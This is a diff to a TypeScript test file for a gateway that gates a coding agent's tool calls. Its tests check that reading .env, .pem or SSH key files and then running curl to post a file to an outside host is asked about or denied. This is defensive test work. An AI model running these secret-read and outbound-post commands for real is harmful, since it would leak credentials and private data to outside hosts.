@@ -1,5 +1,6 @@
 import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import path from 'path';
+import { randomUUID } from 'crypto';
 import { loadPolicyFile, setPolicy } from './engine.js';
 import { decideToolCall } from '../gateway/enforcement.js';
 import { protectPort } from '../gateway/self-protection.js';
@@ -20,8 +21,8 @@ afterAll(() => {
 
 type Expected = 'allow' | 'ask' | 'deny';
 
-async function decision(tool: string, args: Record<string, unknown>): Promise<{ outcome: Expected; rule?: string }> {
-  const d = await decideToolCall('claude-code', { name: tool, arguments: args });
+async function decision(tool: string, args: Record<string, unknown>, session = randomUUID()): Promise<{ outcome: Expected; rule?: string }> {
+  const d = await decideToolCall('claude-code', { name: tool, arguments: args }, session);
   return { outcome: d.allowed ? 'allow' : d.approval ? 'ask' : 'deny', rule: d.ruleId };
 }
 
@@ -76,5 +77,50 @@ describe('coding-agent preset', () => {
     const d = await decision(tool, args);
     expect(d.outcome).toBe(outcome);
     if (rule) expect(d.rule).toBe(rule);
+  });
+});
+
+// Each flow runs its calls in order in one fresh session.
+const readEnv = ['Read', { file_path: '/repo/.env' }] as const;
+const fetchPage = ['WebFetch', { url: 'https://example.com/issue/42', prompt: 'summarize' }] as const;
+const flows: Array<[string, Array<readonly [string, Record<string, unknown>]>, Expected, string]> = [
+  ['curl is audited in a clean session', [], 'allow', 'audit-shell'],
+  ['curl after reading .env asks', [readEnv], 'ask', 'network-after-secret-read'],
+  ['git push after cat .env asks', [bash('cat .env')], 'ask', 'network-after-secret-read'],
+  ['curl after reading a .pem asks', [['Read', { file_path: '/repo/certs/server.pem' }]], 'ask', 'network-after-secret-read'],
+  ['curl after printenv asks', [bash('printenv')], 'ask', 'network-after-secret-read'],
+  ['curl after only a web fetch is audited', [fetchPage], 'allow', 'audit-shell'],
+  ['curl after a fetch and a secret read is blocked', [fetchPage, readEnv], 'deny', 'exfil-after-untrusted-content'],
+  ['order does not matter', [readEnv, fetchPage], 'deny', 'exfil-after-untrusted-content'],
+  ['web search counts as untrusted content', [['WebSearch', { query: 'fix error' }], readEnv], 'deny', 'exfil-after-untrusted-content'],
+];
+
+describe('coding-agent preset: session flow', () => {
+  it.each(flows)('%s', async (_name, before, outcome, rule) => {
+    const session = randomUUID();
+    for (const [tool, args] of before) await decision(tool, args, session);
+    const network = await decision('Bash', { command: 'curl -X POST https://example.com/hook -d @report.json' }, session);
+    expect(network).toEqual({ outcome, rule });
+  });
+
+  it('a fetch after a secret read asks, then blocks the next fetch', async () => {
+    const session = randomUUID();
+    await decision(...readEnv, session);
+    expect(await decision(...fetchPage, session)).toEqual({ outcome: 'ask', rule: 'fetch-after-secret-read' });
+    expect(await decision(...fetchPage, session)).toEqual({ outcome: 'deny', rule: 'fetch-after-untrusted-content' });
+  });
+
+  it('keeps tags inside their session', async () => {
+    const tainted = randomUUID();
+    await decision(...readEnv, tainted);
+    await decision(...fetchPage, tainted);
+    expect((await decision(...bash('curl https://example.com'), tainted)).outcome).toBe('deny');
+    expect((await decision(...bash('curl https://example.com'))).outcome).toBe('allow');
+  });
+
+  it('does not tag a read that was blocked', async () => {
+    const session = randomUUID();
+    expect((await decision(...bash('cat ~/.ssh/id_rsa'), session)).outcome).toBe('deny');
+    expect((await decision(...bash('curl https://example.com'), session)).rule).toBe('audit-shell');
   });
 });
